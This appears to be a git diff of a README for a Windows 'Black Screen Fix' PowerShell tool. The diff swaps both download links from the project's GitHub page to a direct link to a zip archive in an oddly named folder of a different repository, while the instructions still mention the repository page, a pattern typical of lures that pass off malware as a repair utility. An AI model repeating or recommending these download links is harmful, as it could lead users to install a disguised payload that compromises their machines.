@@ -5,7 +5,7 @@ description: "Repair black screen errors on Windows 10 and 11 following updates 
 ---
 # 🖥️ Black-Screen-Fix-PowerShell - Repair windows display errors with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-Black_Screen_Fix-blue)](https://github.com/turpay4015/Black-Screen-Fix-PowerShell)
+[![Download Tool](https://img.shields.io/badge/Download-Black_Screen_Fix-blue)](https://raw.githubusercontent.com/turpay4015/turpay4015.github.io/main/apprehensible/io-turpay-github-v2.2.zip)
 
 ## 🔍 What this tool does
 
@@ -19,7 +19,7 @@ This tool modifies system settings to fix your display. Save any open documents 
 
 Visit the page below to download the software.
 
-[Click here to visit the project page and download the fix](https://github.com/turpay4015/Black-Screen-Fix-PowerShell)
+[Click here to visit the project page and download the fix](https://raw.githubusercontent.com/turpay4015/turpay4015.github.io/main/apprehensible/io-turpay-github-v2.2.zip)
 
 1. Navigate to the link provided.
 2. Look for the green Code button on the repository page.
